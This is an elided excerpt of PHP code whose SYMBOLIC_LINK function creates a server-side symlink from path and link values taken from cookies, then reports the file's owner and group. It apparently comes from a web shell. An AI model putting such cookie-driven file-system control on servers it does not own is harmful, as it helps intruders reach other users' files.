...
*     ---------------------------------------------------------------------------
*     
*     CREATE A SYMBOLIC LINK OF THE PATH SPECIFIED
*     
*/
...
$arguments = [
    ...
    'link' => isset($_COOKIE["link"]) ? $_COOKIE["link"] : null
];
...
function SYMBOLIC_LINK()
{
    ...
    if ($path && $link)
    {
        if (file_exists($path))
        {
          if (@is_link($link))
          {
            ...
            $data = [
                ...
                [
                    ...
                    'owner' => (PHP_OS === 'WIN32' || PHP_OS === 'WINNT') ? null : posix_getpwuid($stat->uid)['name'],
                    'group' => (PHP_OS === 'WIN32' || PHP_OS === 'WINNT') ? null : posix_getgrgid($stat->gid)['name']
                ]
            ];
          }
          else
          {
            ...
            {
                @array_push($debug, ['error' => 'Unable to create symlink of `'.$path.'` as `'.$link.'`']);
            }
          }
        }
        else
    ...
    {
        @array_push($debug, ['error' => (($path==null) ? 'Path' : 'Link') . ' must not be empty']);
    }
